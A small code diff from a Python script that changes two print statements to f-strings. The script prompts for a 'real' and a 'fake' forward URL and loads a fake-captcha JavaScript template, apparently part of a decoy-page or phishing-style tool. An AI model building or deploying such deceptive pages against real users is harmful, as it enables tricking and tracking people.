@@ -13,12 +13,12 @@ fake_forward = os.getenv('DISPLAY_URL')
 if real_forward is None:
     real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
 else:
-    utils.print(f'{G}[+] {C}Real Forward URL :{W} '+real_forward)
+    utils.print(f'{G}[+] {C}Real Forward URL :{W} {real_forward}')
 
 if fake_forward is None:
     fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
 else:
-    utils.print(f'{G}[+] {C}Fake Forward URL :{W} '+fake_forward)
+    utils.print(f'{G}[+] {C}Fake Forward URL :{W} {fake_forward}')
 
 with open('template/captcha/js/main_temp.js', 'r') as location_temp:
     js_file = location_temp.read()
